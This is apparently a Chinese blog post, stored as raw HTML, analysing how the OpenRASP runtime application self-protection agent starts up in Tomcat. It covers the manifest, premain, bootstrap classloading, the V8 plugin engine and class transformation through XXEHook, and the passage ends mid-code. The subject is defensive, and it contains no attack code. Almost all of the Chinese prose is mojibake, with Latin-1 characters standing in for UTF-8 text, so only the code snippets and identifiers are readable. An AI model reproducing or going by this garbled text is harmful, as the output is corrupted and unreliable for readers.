æ€§çš„ä½¿ç”¨RASPæŠ€æœ¯ï¼ˆåº”ç”¨è¿è¡Œæ—¶è‡ªæˆ‘ä¿æŠ¤ï¼‰ï¼Œç›´æ¥æ³¨å…¥åˆ°è¢«ä¿æŠ¤åº”ç”¨çš„æœåŠ¡ä¸­æä¾›å‡½æ•°çº§åˆ«çš„å®æ—¶é˜²æŠ¤ï¼Œå¯ä»¥åœ¨ä¸æ›´æ–°ç­–ç•¥ä»¥åŠä¸å‡çº§è¢«ä¿æŠ¤åº”ç”¨ä»£ç çš„æƒ…å†µä¸‹æ£€æµ‹&#x2F;é˜²æŠ¤æœªçŸ¥æ¼æ´ï¼Œå°¤å…¶é€‚åˆå¤§é‡ä½¿ç”¨å¼€æºç»„ä»¶çš„äº’è”ç½‘åº”ç”¨ä»¥åŠä½¿ç”¨ç¬¬ä¸‰æ–¹é›†æˆå•†å¼€å‘çš„é‡‘èç±»åº”ç”¨ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹OpenRASPåœ¨Tomcatä¸­æ˜¯æ€æ ·æ‰‹åŠ¨å®‰è£…çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5341ddac507cc8231bd.jpg" title="image-20230805164731893" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5341ddac507cc8231bd.jpg" alt="image-20230805164731893"></a></p><p>åœ¨OpenRASPä¸­é™¤äº†RaspInstall.jarè¿™ä¸ªç”¨æ¥å®‰è£…OpenRASPçš„jaråŒ…å¤–ï¼Œè¿˜æœ‰rasp.jarå’Œrasp-engine.jarè¿™ä¸¤ä¸ªjaråŒ…ã€‚å¯ä»¥çœ‹åˆ°åœ¨Tomcatä¸­æ‰‹åŠ¨å®‰è£…OpenRASPçš„è¯ï¼Œéœ€è¦å¢åŠ -javaagenté¡¹è®¾ç½®ä¸ºrasp.jarã€‚è€æƒ¯ä¾‹ï¼Œå…ˆçœ‹çœ‹MAINFEST.MFï¼Œä»¥ä¸‹æ˜¯rasp.jarçš„MAINFEST.MFæ–‡ä»¶çš„å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Build-Time: 2022-01-28T09:49:33Z</span><br><span class="line">Last-Commit-User-Email: CaledoniaProject@users.noreply.github.com</span><br><span class="line">Built-By: root</span><br><span class="line">Premain-Class: com.baidu.openrasp.Agent</span><br><span class="line">Created-By: Apache Maven 3.2.3</span><br><span class="line">Git-Branch: master</span><br><span class="line">Git-Commit: a0634d6</span><br><span class="line">Last-Commit-User-Name: CaledoniaProject</span><br><span class="line">Build-Jdk: 1.6.0_45</span><br><span class="line">Project-Version: 1.3.7</span><br><span class="line">Agent-Class: com.baidu.openrasp.Agent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Main-Class: com.baidu.openrasp.Agent</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Archiver-Version: Plexus Archiver</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åªå…³å¿ƒPremain-Classã€Agent-Classã€Can-Redefine-Classesã€Main-Classå’ŒCan-Retransform-Classesè¿™5ä¸ªé…ç½®ã€‚å¯ä»¥çœ‹åˆ°Main-Classæ˜¯com.baidu.openrasp.Agentï¼Œè‹¥æ˜¯æ‰§è¡Œè¿™ä¸ªrasp.jarï¼Œä»£ç å°†ä»com.baidu.openrasp.Agent#mainå¼€å§‹ã€‚Premain-Classä¹Ÿæ˜¯com.baidu.openrasp.Agentï¼Œå› ä¸ºè®¾ç½®äº†-javaagenté¡¹ï¼Œå› æ­¤è‹¥è¿è¡Œåˆ©ç”¨Tomcatéƒ¨ç½²Webé¡¹ç›®æ—¶ä¼šé¦–å…ˆæ‰§è¡Œcom.baidu.openrasp.Agent#premainã€‚Can-Redefine-Classeså’ŒCan-Retransform-Classesè¿™ä¸¤ä¸ªé…ç½®é¡¹å› ä¸ºè¦é‡æ–°å®šä¹‰classå¿…ç„¶è®¾ç½®ä¸ºtrueä¸å¿…è¯´ã€‚Agent-ClassæŒ‡å®šçš„ä¹Ÿæ˜¯com.baidu.openrasp.Agentï¼Œé‚£ä¹ˆå½“attachç›®æ ‡classçš„æ—¶å€™å°±ä¼šæ‰§è¡Œcom.baidu.openrasp.Agent#agentmainã€‚</p><h3 id="OpenRASPå¯åŠ¨æµç¨‹åˆ†æ"><a href="#OpenRASPå¯åŠ¨æµç¨‹åˆ†æ" class="headerlink" title="OpenRASPå¯åŠ¨æµç¨‹åˆ†æ"></a>OpenRASPå¯åŠ¨æµç¨‹åˆ†æ</h3><p>åœ¨IDEAè°ƒè¯•æ—¶ï¼Œå¯ä»¥åœ¨å³ä¸Šè§’çš„Tomcaté…ç½®ä¸­åŠ ä¸ŠVM Optionsï¼Œé€šè¿‡-javaagenté¡¹æŒ‡å®šrasp.jarã€‚å› ä¸ºé…ç½®äº†<code>-javaagent</code>ï¼Œå› æ­¤é¦–å…ˆè¿›å…¥com.baidu.openrasp.Agent#premainï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5541ddac507cc826f2e.jpg" title="image-20230805165633563" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5541ddac507cc826f2e.jpg" alt="image-20230805165633563"></a></p><p>è·Ÿè¿›initæ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5621ddac507cc828ca6.jpg" title="image-20230805165926450" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5621ddac507cc828ca6.jpg" alt="image-20230805165926450"></a></p><p>ä»¥ä¸‹æ˜¯JarFileHelperçš„addJarToBootstrapæ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5731ddac507cc82af30.jpg" title="image-20230805170651161" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5731ddac507cc82af30.jpg" alt="image-20230805170651161"></a></p><p>è¿™é‡Œé€šè¿‡Instrumentationçš„<code>appendToBootstrapClassLoaderSearch</code>æ–¹æ³•ï¼ŒæŠŠrasp.jaråŒ…æ”¾åˆ°Bootstrap ClassLoaderçš„æœç´¢è·¯å¾„ã€‚è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¿™æ ·åšï¼Œå› ä¸ºjavaçš„åŒäº²å§”æ´¾æœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦å°†<code>rasp.jar</code>åŒ…åŠ å…¥åˆ°äº†<code>BootStrapClassLoader</code>ä¸‹ï¼Œå¦åˆ™å½“æˆ‘ä»¬éœ€è¦hookåƒ java.io.Fileæˆ–è€…java.lang.ProcessImpl è¿™æ ·ç”± <code>BootstrapClassLoader</code> åŠ è½½çš„ç±»çš„æ—¶å€™ï¼Œå°±æ— æ³•æ£€æµ‹åˆ°äº†ã€‚å› æ­¤å°† rasp.jar æ·»åŠ åˆ° <code>BootstrapClassLoader</code> çš„ClassPathä¸‹ï¼Œæ”¶åˆ°ç±»åŠ è½½å§”æ´¾ä»»åŠ¡æ—¶ï¼Œå°±èƒ½é€šè¿‡è¯¥classpathåŠ è½½åˆ°rasp.jarçš„æ‰€æœ‰ç±»äº†ï¼Œé‚£ä¹ˆï¼Œä¹Ÿå°±æ„å‘³ç€ï¼Œä»»ä½•ä¸€ä¸ªç±»åŠ è½½å™¨ä¸­çš„ä»»ä½•ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½é€šè¿‡æ˜¾å¼æˆ–è€…éšå¼åŠ è½½ï¼ŒåŠ è½½åˆ°rasp.jarä¸­çš„ç±»ã€‚</p><p>ä¹‹åè°ƒç”¨äº†ModuleLoader.load()ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯ç”¨æ¥åŠ è½½å’Œåˆå§‹åŒ–å¼•æ“æ¨¡å—ï¼Œå³ä¹‹å‰æåˆ°çš„rasp-engine.jarï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5811ddac507cc82ce9f.jpg" title="image-20230805171655179" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5811ddac507cc82ce9f.jpg" alt="image-20230805171655179"></a></p><p>è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªModuleLoaderå®ä¾‹ï¼Œç»§ç»­è·Ÿè¿›ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd58f1ddac507cc82ede5.jpg" title="image-20230805171740140" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd58f1ddac507cc82ede5.jpg" alt="image-20230805171740140"></a></p><p>ä»å‡½æ•°åå°±å¯ä»¥çŸ¥é“è¿™ä¸ª<code>setStartupOptionForJboss</code>å‡½æ•°æ˜¯ç”¨æ¥ä¸ºJbossè®¾ç½®ä¸€äº›èµ·å§‹é€‰é¡¹çš„ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd59c1ddac507cc830933.jpg" title="image-20230805172119071" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd59c1ddac507cc830933.jpg" alt="image-20230805172119071"></a></p><p>è¿™é‡Œé€šè¿‡è·å–åˆ°ç³»ç»Ÿç±»åŠ è½½å™¨åŠ è½½å­—èŠ‚ç classçš„è·¯å¾„åï¼Œåˆ¤æ–­æ˜¯å¦æœ‰jboss-modules.jarï¼Œå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬ä½¿ç”¨Tomcatæ²¡æœ‰è¿™ä¸ªjaråŒ…ã€‚è‹¥åˆ¤æ–­æ˜¯Jbossä¸­é—´ä»¶çš„è¯ï¼Œä¼šè°ƒç”¨setSystemPropertyå‡½æ•°è®¾ç½®ç›¸å…³å±æ€§å’Œé¢„åŠ è½½åŒ…ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5ad1ddac507cc83293c.jpg" title="image-20230805172333798" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5ad1ddac507cc83293c.jpg" alt="image-20230805172333798"></a></p><p>ä¹‹åç»§ç»­æ‰§è¡Œï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5b71ddac507cc833e67.jpg" title="image-20230805172428128" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5b71ddac507cc833e67.jpg" alt="image-20230805172428128"></a></p><p>åˆ›å»ºäº†ä¸€ä¸ªModuleContainerå®ä¾‹ï¼Œä¼ å…¥äº†åŒ…årasp-engine.jarï¼Œè¿›å…¥ModuleContainerçš„æ„é€ å‡½æ•°ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5c31ddac507cc835809.jpg" title="image-20230805172647805" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5c31ddac507cc835809.jpg" alt="image-20230805172647805"></a></p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªJarFileå¯¹è±¡æŒ‡å‘rasp-engine.jaræ–‡ä»¶ï¼Œç„¶åè·å–jaråŒ…ä¸­çš„MAINFEST.MFæ–‡ä»¶ä¸­çš„å±æ€§ï¼Œå°†Rasp-Module-Nameçš„å€¼èµ‹å€¼ç»™this.moduleNameï¼Œå°†Rasp-Module-Classçš„å€¼èµ‹å€¼ç»™moduleEnterClassNameã€‚Rasp-Module-Classçš„å€¼æ˜¯com.baidu.openrasp.EngineBootï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5ce1ddac507cc836e26.jpg" title="image-20230805173137167" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5ce1ddac507cc836e26.jpg" alt="image-20230805173137167"></a></p><p>ä¹‹åå°†com.baidu.openrasp.EngineBootå®ä¾‹åŒ–èµ‹å€¼ç»™this.moduleï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5db1ddac507cc83882e.jpg" title="image-20230805173119508" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5db1ddac507cc83882e.jpg" alt="image-20230805173119508"></a></p><p>ä»£ç ä¸­æ˜¯é€šè¿‡ModuleLoader.moduleClassLoaderæ¥åŠ è½½com.baidu.openrasp.EngineBootçš„ï¼Œè€ŒmoduleClassLoaderåœ¨ModuleLoaderç±»ä¸­çš„staticå—ä¸­æœ‰æ‰€å®šä¹‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader systemClassLoader;</span><br><span class="line"><span class="keyword">for</span>(systemClassLoader = ClassLoader.getSystemClassLoader(); systemClassLoader.getParent() != <span class="literal">null</span> &amp;&amp; !systemClassLoader.getClass().getName().equals(<span class="string">&quot;sun.misc.Launcher$ExtClassLoader&quot;</span>); systemClassLoader = systemClassLoader.getParent()) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">moduleClassLoader = systemClassLoader;</span><br></pre></td></tr></table></figure><p>æ‰©å±•ç±»åŠ è½½å™¨çš„çˆ¶ç±»åŠ è½½å™¨ä¸ºå¯åŠ¨ç±»åŠ è½½å™¨ï¼Œå³Bootstrap ClassLoaderï¼Œå› æ­¤moduleClassLoaderæ˜¯å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œè¿™é‡Œéœ€è¦è®°ä¸€ä¸‹ã€‚ä¹‹åModuleContainerçš„æ„é€ æ–¹æ³•ç»“æŸï¼Œç»§ç»­æ‰§è¡Œcom.baidu.openrasp.ModuleContainer#startï¼Œä»¥ä¸‹æ˜¯è¯¥æ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5e81ddac507cc83a490.jpg" title="image-20230805173319080" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5e81ddac507cc83a490.jpg" alt="image-20230805173319080"></a></p><p>è°ƒç”¨äº†com.baidu.openrasp.EngineBootçš„startæ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­è¿›è¡Œäº†ï¼šè¾“å‡ºBannerä¿¡æ¯ï¼ŒåŠ è½½V8å¼•æ“ã€åˆå§‹åŒ–æ’ä»¶ç³»ç»Ÿã€é…ç½®æ ¸æŸ¥ã€åˆå§‹åŒ–å­—èŠ‚ç è½¬æ¢æ¨¡å—ã€åˆå§‹åŒ–äº‘ç®¡ç†æ¨¡å—ç­‰æ“ä½œï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5f31ddac507cc83bb5c.jpg" title="image-20230805173434615" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5f31ddac507cc83bb5c.jpg" alt="image-20230805173434615"></a></p><p>é¦–å…ˆè¾“å‡ºäº†Bannerï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œæ—¥å¿—ä¸­çœ‹åˆ°ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd5fe1ddac507cc83d001.jpg" title="image-20230805173518945" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd5fe1ddac507cc83d001.jpg" alt="image-20230805173518945"></a></p><p>ä¹‹åæ‰§è¡Œäº†<code>Loader.load();</code>ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd60b1ddac507cc83ecc5.jpg" title="image-20230805174227846" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd60b1ddac507cc83ecc5.jpg" alt="image-20230805174227846"></a></p><p><a href="https://pic.imgdb.cn/item/64cfd6151ddac507cc840142.jpg" title="image-20230805174240220" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6151ddac507cc840142.jpg" alt="image-20230805174240220"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼ŒåŠ è½½äº†ä¸€ä¸ªJNIåº“æ–‡ä»¶ã€‚æ­¤å¤„å®ŒæˆV8å¼•æ“çš„åŠ è½½ï¼Œç”¨äºè§£é‡Šæ‰§è¡ŒJavaScriptã€‚OpenRaspçš„ä¸€å¤§ç‰¹è‰²å°±æ˜¯å°†éƒ¨åˆ†è§„åˆ™é€šè¿‡JSæ’ä»¶çš„å½¢å¼æ¥å®ç°ç¼–å†™ï¼Œè¿™æ ·åšæœ‰ä¸¤ä¸ªä¼˜åŠ¿ï¼Œä¸€æ˜¯å¯ä»¥å®ç°<strong>è·¨å¹³å°ä½¿ç”¨</strong>ï¼Œå‡å°‘äº†ä¸ºä¸åŒè¯­è¨€é‡å¤åˆ¶å®šç›¸åŒè§„åˆ™çš„é—®é¢˜ã€‚å¦ä¸€ä¸ªå°±æ˜¯å¯ä»¥<strong>å®ç°è§„åˆ™çš„çƒ­éƒ¨ç½²</strong>ï¼Œæ·»åŠ æˆ–ä¿®æ”¹è§„åˆ™ä¸éœ€è¦é‡æ–°å¯åŠ¨æœåŠ¡ã€‚æ¥ç€è°ƒç”¨äº†<code>com.baidu.openrasp.EngineBoot#loadConfig</code>ï¼Œå®Œæˆåˆå§‹åŒ–log4jã€æ£€æŸ¥äº‘æ§é…ç½®ä¿¡æ¯ä»¥åŠè¯»å–é…ç½®ä¿¡æ¯ï¼Œåˆå§‹åŒ–syslogæœåŠ¡è¿æ¥ç­‰æ“ä½œï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd61f1ddac507cc84145e.jpg" title="image-20230805174833561" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd61f1ddac507cc84145e.jpg" alt="image-20230805174833561"></a></p><p>æ¥ç€åˆæ‰§è¡Œäº†<code>JS.Initialize()</code>ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd62b1ddac507cc842d68.jpg" title="image-20230805181639916" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd62b1ddac507cc842d68.jpg" alt="image-20230805181639916"></a></p><p>è®¾ç½®v8è·å–æ ˆä¿¡æ¯çš„getteræ–¹æ³•ï¼Œè¿™é‡Œè·å¾—çš„æ ˆä¿¡æ¯ï¼Œæ¯ä¸€æ¡ä¿¡æ¯åŒ…æ‹¬ç±»åã€æ–¹æ³•åå’Œè¡Œå·classname@methodname(linenumber)ã€‚ç´§æ¥ç€æ˜¯å¯¹æ’ä»¶çš„æ›´æ–°ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd63a1ddac507cc844e4a.jpg" title="image-20230805182223918" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd63a1ddac507cc844e4a.jpg" alt="image-20230805182223918"></a></p><p>è·å–pluginsç›®å½•ä¸‹çš„æ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå…¶ä¸­è¦æ±‚åç¼€åä¸º.jsï¼Œä¹‹åè·å–åˆ°åˆæ³•çš„pluginæ–‡ä»¶åï¼Œå°†æ–‡ä»¶çš„åå­—å’Œå†…å®¹æ·»åŠ åˆ°scriptsï¼Œå¹¶æ‰§è¡Œ<code>UpdatePlugin(scripts);</code>ï¼Œä½¿ç”¨V8å¼•æ“è¿›è¡Œä¿¡æ¯çš„æå–ã€‚ä¹‹åè°ƒç”¨<code>InitFileWatcher</code>æ–¹æ³•æ¥å®ç°å¯¹jsé…ç½®æ–‡ä»¶çš„ç›‘å¬äº‹ä»¶ï¼Œä»è€Œå®ç°çƒ­éƒ¨ç½²ï¼ŒåŠ¨æ€çš„å¢åˆ jsä¸­çš„æ£€æµ‹è§„åˆ™ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6471ddac507cc846a93.jpg" title="image-20230805183104173" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6471ddac507cc846a93.jpg" alt="image-20230805183104173"></a></p><p>ç´§æ¥ç€è°ƒç”¨<code>CheckerManager.init()</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6531ddac507cc8484e8.jpg" title="image-20230805183947706" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6531ddac507cc8484e8.jpg" alt="image-20230805183947706"></a></p><p>Typeç±»å¦‚ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd65d1ddac507cc84997b.jpg" title="image-20230805184036441" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd65d1ddac507cc84997b.jpg" alt="image-20230805184036441"></a></p><p>ä»æšä¸¾ç±»com.baidu.openrasp.plugin.checker.CheckParameter.Typeä¸­è¯»å–æ‰€æœ‰çš„checkerï¼ŒåŒ…å«ä¸‰ç§ç±»å‹çš„checkerï¼Œä¸€æ˜¯jsæ’ä»¶æ£€æµ‹ï¼Œæ„å‘³ç€è¿™ä¸ªcheckerä¼šè°ƒç”¨js pluginè¿›è¡Œæ”»å‡»æ£€æµ‹ï¼ŒäºŒæ˜¯javaæœ¬åœ°æ£€æµ‹ï¼Œæ„å‘³ç€æ˜¯è°ƒç”¨æœ¬åœ°javaä»£ç è¿›è¡Œæ”»å‡»æ£€æµ‹ï¼Œä¸‰æ˜¯å®‰å…¨åŸºçº¿æ£€æµ‹ï¼Œæ˜¯ç”¨äºæ£€æµ‹ä¸€äº›é«˜é£é™©ç±»çš„å®‰å…¨æ€§åŸºçº¿æ£€æµ‹ï¼Œæ£€æµ‹å…¶é…ç½®æ˜¯å¦æœ‰å®‰å…¨éšæ‚£ã€‚</p><p>è¿›æ¥ç€è°ƒç”¨<code>this.initTransformer(inst)</code>ï¼Œè·Ÿè¿›ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6681ddac507cc84ae51.jpg" title="image-20230805184657314" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6681ddac507cc84ae51.jpg" alt="image-20230805184657314"></a></p><p>CustomClassTransformeræ˜¯ClassFileTransformerçš„å®ç°ç±»ï¼Œä»¥ä¸‹æ˜¯è¯¥ç±»çš„ä¸€ç§æ„é€ æ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6751ddac507cc84c5c6.jpg" title="image-20230805184756487" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6751ddac507cc84c5c6.jpg" alt="image-20230805184756487"></a></p><p>addTransformer()ä¸­æŒ‡å®šçš„transfromerä¸ºè‡ªå·±ï¼Œä¹Ÿå°±æ˜¯CustomClassTransformerï¼Œä¹‹åæ‰§è¡ŒaddAnnotationHook()ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd67f1ddac507cc84da61.jpg" title="image-20230805185014583" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd67f1ddac507cc84da61.jpg" alt="image-20230805185014583"></a></p><p>è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨å°±æ˜¯æ‰«æcom.baidu.openrasp.hookåŒ…ä¸‹æœ‰@HookAnnotationæ³¨è§£çš„ç±»ï¼Œä¹‹åå¾ªç¯è°ƒç”¨addHook()æ–¹æ³•ï¼Œå°†æ‰€æœ‰ä¸æ˜¯é…ç½®æ–‡ä»¶ä¸­hooks.ignoreæŒ‡å®šçš„ç±»å‹çš„å¯¹è±¡æ·»åŠ åˆ°this.hooksä¸­ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd68b1ddac507cc84f15c.jpg" title="image-20230805190113349" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd68b1ddac507cc84f15c.jpg" alt="image-20230805190113349"></a></p><p>è¿™ä¸ªhookså­—æ®µæ˜¯ç”¨æ¥æä¾›åœ¨åç»­ç±»åŠ è½½é€šè¿‡com.baidu.openrasp.transformer.CustomClassTransformer#transformçš„æ—¶å€™ï¼Œå¯¹å…¶è¿›è¡ŒåŒ¹é…ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦hookã€‚æ¥ä¸‹æ¥å›åˆ°com.baidu.openrasp.EngineBoot#initTransformerä¸­ï¼Œè°ƒç”¨äº†com.baidu.openrasp.transformer.CustomClassTransformer#retransformï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6971ddac507cc850a4e.jpg" title="image-20230805190139754" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6971ddac507cc850a4e.jpg" alt="image-20230805190139754"></a></p><p><a href="https://pic.imgdb.cn/item/64cfd6a21ddac507cc8522a2.jpg" title="image-20230805190728654" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6a21ddac507cc8522a2.jpg" alt="image-20230805190728654"></a></p><p>é€šè¿‡è°ƒç”¨isClassMatchedåˆ¤æ–­è¿™ä¸ªç±»æ˜¯å¦æ˜¯Hookçš„ç±»ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6ab1ddac507cc8535c9.jpg" title="image-20230805190933320" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6ab1ddac507cc8535c9.jpg" alt="image-20230805190933320"></a></p><p>é€šè¿‡è¿­ä»£this.hooksï¼Œè°ƒç”¨å¯¹åº”çš„isClassMatched()æ–¹æ³•è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœéœ€è¦hookï¼Œåˆ™è°ƒç”¨retransformClasses()å¯¹è¯¥classè¿›è¡Œé‡æ–°å®šä¹‰ï¼Œé‡æ–°è§¦å‘å¯¹è¯¥ç±»çš„æ‹¦æˆªï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹<code>com.baidu.openrasp.transformer.CustomClassTransformer#transform</code>æ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6b71ddac507cc854e5b.jpg" title="image-20230805224633278" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6b71ddac507cc854e5b.jpg" alt="image-20230805224633278"></a></p><p>åœ¨è¿™é‡Œä¾ç„¶ä¸æ–­å¾ªç¯è¿­ä»£hooksï¼Œå¯¹classè¿›è¡ŒåŒ¹é…ï¼Œä¹‹åè°ƒç”¨hookç±»çš„transformClassæ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6c51ddac507cc856862.jpg" title="image-20230805225328777" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6c51ddac507cc856862.jpg" alt="image-20230805225328777"></a></p><p>åˆè°ƒç”¨äº†hookMethod()æ–¹æ³•æ¥è¿›è¡Œå­—èŠ‚ç çš„ä¿®æ”¹ã€‚</p><h3 id="OpenRASP-Hook"><a href="#OpenRASP-Hook" class="headerlink" title="OpenRASP Hook"></a>OpenRASP Hook</h3><p>é‚£æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŒ‘ä¸€ä¸ªä¾‹å­æ¥çœ‹çœ‹OpenRASPçš„Hookæµç¨‹ï¼Œä¾‹å¦‚com.baidu.openrasp.hook.xxe.XXEHookã€‚æˆ‘ä»¬é¦–å…ˆçœ‹çœ‹com.baidu.openrasp.hook.xxe.XXEHook#isClassMatchedï¼Œäº†è§£ä¸€ä¸‹æ˜¯å¦‚ä½•å¯¹éœ€è¦hookçš„ç±»åšåŒ¹é…çš„ï¼Œè¯¥æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6d21ddac507cc85827c.jpg" title="image-20230805234958546" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6d21ddac507cc85827c.jpg" alt="image-20230805234958546"></a></p><p>ä»£ç å¾ˆç®€å•ï¼Œè¿™é‡Œæ£€æµ‹æ˜¯å¦æ˜¯å¯èƒ½å­˜åœ¨XXEæ¼æ´çš„ç±»ã€‚ä¹‹åæŸ¥çœ‹<code>com.baidu.openrasp.hook.xxe.XXEHook#hookMethod</code>ï¼Œçœ‹çœ‹æ˜¯æ€ä¹ˆæ›´æ”¹è¿™äº›ç±»çš„ä»£ç çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd6df1ddac507cc859e6a.jpg" title="image-20230805235310814" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd6df1ddac507cc859e6a.jpg" alt="image-20230805235310814"></a></p><p>è¿™é‡Œé€šè¿‡è°ƒç”¨äº†<code>com.baidu.openrasp.hook.AbstractClassHook#getInvokeStaticSrc</code>æ–¹æ³•è·å–äº†éœ€è¦æ’å…¥åˆ°è¿™äº›ç±»çš„expandSystemId()å’ŒsetDescription()æ–¹æ³•ä¸­çš„ä¸€äº›ä»£ç ã€‚getInvokeStaticSrc()å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title 